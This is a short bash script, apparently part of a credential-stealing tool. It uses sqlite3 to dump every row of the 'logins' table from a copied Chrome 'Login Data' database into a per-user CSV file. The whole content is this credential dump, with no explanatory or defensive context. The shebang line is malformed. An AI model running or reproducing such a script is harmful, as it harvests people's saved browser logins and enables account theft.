#a!/bin/bash
sqlite3 -csv -header '/tmp/chrome-tmp/Default/Login Data' "select * from logins" >> $USER-pwlist.csv
